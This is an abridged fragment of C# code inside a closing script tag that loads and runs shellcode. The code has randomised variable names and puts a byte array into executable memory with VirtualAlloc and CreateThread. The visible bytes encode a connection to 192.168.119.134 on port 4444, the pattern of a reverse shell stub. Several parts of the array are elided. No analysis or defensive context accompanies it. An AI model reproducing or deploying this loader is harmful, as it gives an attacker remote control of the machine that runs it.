...
0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0xc0,0xa8,0x77,0x86,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,
...
0x00,0x53,0xff,0xd5 };
        ...
        IntPtr fVD6zTxfS = VirtualAlloc(IntPtr.Zero,(UIntPtr)gihDvy.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(gihDvy,0,fVD6zTxfS,gihDvy.Length);
        IntPtr jqpz6oAPB5n4 = IntPtr.Zero;
        IntPtr biq = CreateThread(IntPtr.Zero,UIntPtr.Zero,fVD6zTxfS,IntPtr.Zero,0,ref jqpz6oAPB5n4);
    }
</script>
